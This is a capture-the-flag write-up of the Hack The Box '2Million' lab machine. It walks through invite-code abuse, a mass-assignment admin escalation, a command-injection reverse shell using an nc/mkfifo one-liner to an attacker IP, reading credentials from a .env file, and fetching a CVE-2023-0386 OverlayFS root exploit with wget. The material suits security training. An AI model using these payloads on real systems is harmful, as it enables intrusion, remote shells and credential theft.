# Hack The Box — 2Million

> **Difficulty:** Easy
> 
> **OS:** Linux
> 
> **IP:** `10.129.229.66`
> 
> **Domain:** `2million.htb`

## 1. Initial Recon

### Add the Host to `/etc/hosts`

First, add the target to `/etc/hosts`:

```bash
echo "10.129.229.66 2million.htb" | sudo tee -a /etc/hosts
```

### Nmap

Run a full TCP port scan with default scripts and version detection:

```bash
nmap -sC -sV -p- --min-rate 1000 10.129.229.66
```

Results:

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1
80/tcp open  http    nginx
```

Only two ports are exposed:

- `22/tcp` — SSH
    
- `80/tcp` — HTTP
    

The HTTP service redirects to:

```text
http://2million.htb/
```

---

# 2. Web Enumeration

Visiting:

```text
http://2million.htb
```

reveals the 2Million web application.

The application requires an invite code before a user can register.

While inspecting the site's JavaScript files, I found:

```text
inviteapi.min.js
```

The JavaScript contains functionality for generating an invite code.

After deobfuscating/beautifying the JavaScript, the following function stood out:

```javascript
function makeInviteCode() {

    $.ajax({

        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/how/to/generate',

        success: function (response) {
            console.log(response)
        },

        error: function (response) {
            console.log(response)
        }

    })

}
```

The function makes a request to:

```text
/api/v1/invite/how/to/generate
```

Calling `makeInviteCode()` from the browser developer console returns:

```json
{
    "data": "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr",
    "enctype": "ROT13"
}
```

The response tells us that the returned data is encoded using **ROT13**.

Decoding the message reveals instructions to make a `POST` request to:

```text
/api/v1/invite/generate
```

---

# 3. Generating an Invite Code

The invite-generation endpoint can be accessed with a POST request.

For example:

```bash
curl -X POST http://2million.htb/api/v1/invite/generate
```

The response contains an encoded invite code.

The returned value needs to be decoded before it can be used.

After decoding the generated invite code, I was able to register an account on the application.

Once registered, I logged into the application and continued enumerating the API.

---

# 4. API Enumeration

Navigating to:

```text
http://2million.htb/api/v1
```

reveals an API route listing.

The user endpoints include:

```text
GET
/api/v1
/api/v1/invite/how/to/generate
/api/v1/invite/generate
/api/v1/invite/verify
/api/v1/user/auth
/api/v1/user/vpn/generate
/api/v1/user/vpn/regenerate
/api/v1/user/vpn/download

POST
/api/v1/user/register
/api/v1/user/login
```

More importantly, there is an administrative API:

```text
GET
/api/v1/admin/auth

POST
/api/v1/admin/vpn/generate

PUT
/api/v1/admin/settings/update
```

The following endpoint immediately stands out:

```text
/api/v1/admin/settings/update
```

It appears to allow user settings to be modified.

---

# 5. Privilege Escalation — Mass Assignment

I used Burp Suite to intercept a request to:

```text
/api/v1/admin/settings/update
```

Initially, the endpoint rejected requests because the expected content type was JSON.

The request needed:

```http
Content-Type: application/json
```

After experimenting with the parameters accepted by the endpoint, I discovered that the `is_admin` property could be modified.

The final request looked like:

```http
PUT /api/v1/admin/settings/update HTTP/1.1
Host: 2million.htb
Content-Type: application/json
Cookie: PHPSESSID=<SESSION_ID>

{
    "email": "test@email.com",
    "is_admin": 1
}
```

The application does not properly restrict which properties a user is allowed to modify.

By setting:

```json
"is_admin": 1
```

my account was elevated to administrator.

This is a **mass assignment vulnerability**.

I verified the privilege escalation through:

```text
/api/v1/admin/auth
```

---

# 6. Command Injection

With administrator privileges, I could access:

```text
POST /api/v1/admin/vpn/generate
```

This endpoint generates a VPN configuration for a specified user.

The `username` parameter was vulnerable to command injection.

I used the following payload:

```text
sarp && rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.175 4444 >/tmp/f #
```

Start a listener on the attacking machine:

```bash
nc -lvnp 4444
```

Then send the malicious request:

```bash
curl -X POST 'http://2million.htb/api/v1/admin/vpn/generate' \
  --cookie 'PHPSESSID=<SESSION_ID>' \
  --header 'Content-Type: application/json' \
  --data '{"username":"sarp && rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.175 4444 >/tmp/f #"}'
```

The server executes the injected command and connects back to my listener.

I now have a shell on the target.

---

# 7. Credential Discovery

After obtaining the reverse shell, I started enumerating the web application's files and configuration.

The web application was located under:

```bash
cd /var/www/html
```

List the contents:

```bash
ls -la
```

One of the interesting files is the application's environment/configuration file:

```text
/var/www/html/.env
```

Inspect it:

```bash
cat /var/www/html/.env
```

The configuration contains credentials used by the application.

The relevant credentials can then be used to authenticate to the SSH service exposed on port `22`.

The credential-discovery path is therefore:

```text
Reverse shell
     |
     v
/var/www/html
     |
     v
.env
     |
     v
Application credentials
     |
     v
SSH credentials
```

I used the discovered credentials to connect over SSH:

```bash
ssh <USERNAME>@10.129.229.66
```

The credentials were valid, giving me a stable SSH session.

Verify the current user:

```bash
whoami
```

```text
<USERNAME>
```

The user flag can now be retrieved:

```bash
cat ~/user.txt
```

> **Note:** The exact username/password should be replaced with the credentials you recovered during your enumeration.

---

# 8. Privilege Escalation Enumeration

With SSH access established, I continued enumerating the machine for privilege-escalation vectors.

One interesting directory was:

```text
/var/mail
```

List the available mailboxes:

```bash
ls -la /var/mail
```

I then read the relevant mailbox:

```bash
cat /var/mail/<USER>
```

The email contained information about a Linux kernel vulnerability.

I checked the running kernel version:

```bash
uname -a
```

The target was running:

```text
5.15.70-051570-generic
```

The information contained in the email pointed towards:

```text
CVE-2023-0386
```

This is a local privilege escalation vulnerability involving **OverlayFS**.

---

# 9. CVE-2023-0386 — OverlayFS

CVE-2023-0386 is a Linux OverlayFS local privilege escalation vulnerability.

Since I already had an unprivileged shell on the target, this vulnerability could be used to escalate privileges to root.

I downloaded a proof of concept for the vulnerability and transferred it to the target.

---

# 10. Transfer the Exploit

On the attacking machine, start a Python HTTP server in the directory containing the exploit:

```bash
python3 -m http.server 8000
```

The target can then download the exploit:

```bash
wget http://10.10.14.175:8000/<exploit>
```

If the exploit is provided as a ZIP archive, extract it with:

```bash
unzip exploit.zip
```

or:

```bash
unzip exploit.zip -d exploit
```

If `unzip` isn't installed, Python can also be used:

```bash
python3 -m zipfile -e exploit.zip exploit
```

---

# 11. Exploiting OverlayFS

After transferring the exploit to the target, I followed the PoC's instructions to execute it.

The exploit successfully abused the vulnerable OverlayFS implementation and resulted in a root shell.

Verify the current privileges:

```bash
id
```

The result shows:

```text
uid=0(root) gid=0(root)
```

We now have root access.

---

# 12. Root Flag

With root access, the root flag can be read with:

```bash
cat /root/root.txt
```

This completes the machine.

---

# 13. Attack Chain

The complete attack chain was:

```text
Nmap
  |
  +-- 22/tcp SSH
  |
  +-- 80/tcp HTTP
        |
        +-- JavaScript enumeration
        |
        +-- inviteapi.min.js
        |
        +-- /api/v1/invite/how/to/generate
        |       |
        |       +-- ROT13
        |       |
        |       +-- /api/v1/invite/generate
        |               |
        |               +-- Invite code
        |                       |
        |                       +-- Account registration
        |
        +-- /api/v1
                |
                +-- API enumeration
                        |
                        +-- /api/v1/admin/settings/update
                        |       |
                        |       +-- Mass assignment
                        |              |
                        |              +-- is_admin = 1
                        |                     |
                        |                     +-- Admin access
                        |
                        +-- /api/v1/admin/vpn/generate
                                |
                                +-- Command injection
                                       |
                                       +-- Reverse shell
                                              |
                                              +-- /var/www/html/.env
                                                     |
                                                     +-- Credentials
                                                            |
                                                            +-- SSH
                                                                   |
                                                                   +-- User
                                                                        |
                                                                        +-- /var/mail
                                                                               |
                                                                               +-- CVE-2023-0386
                                                                                      |
                                                                                      +-- OverlayFS
                                                                                             |
                                                                                             +-- root
```

---

# 14. Vulnerabilities

|Vulnerability|Impact|
|---|---|
|Exposed invite-generation functionality|Account creation|
|ROT13-encoded API instructions|Revealed invite-generation endpoint|
|Mass assignment|Privilege escalation to administrator|
|Command injection|Remote code execution|
|Credentials exposed in application files|SSH access|
|CVE-2023-0386 / OverlayFS|Local privilege escalation to root|

---

# 15. Key Takeaways

- Always inspect JavaScript files during web enumeration.
    
- API route listings can reveal functionality that isn't exposed through the normal UI.
    
- User-controlled properties should be strictly whitelisted by the application.
    
- The `is_admin` parameter allowed a normal user to elevate themselves to administrator.
    
- User input passed to system commands must be properly validated and escaped.
    
- After obtaining a shell, enumerate application directories and configuration files for credentials.
    
- `/var/mail` provided an important clue about the kernel privilege-escalation vulnerability.
    
- Always check the running kernel version when performing Linux privilege-escalation enumeration.
    
- CVE-2023-0386 demonstrates the importance of keeping the Linux kernel patched.
    

---

# Flags

```text
User:
cat ~/user.txt

Root:
cat /root/root.txt
```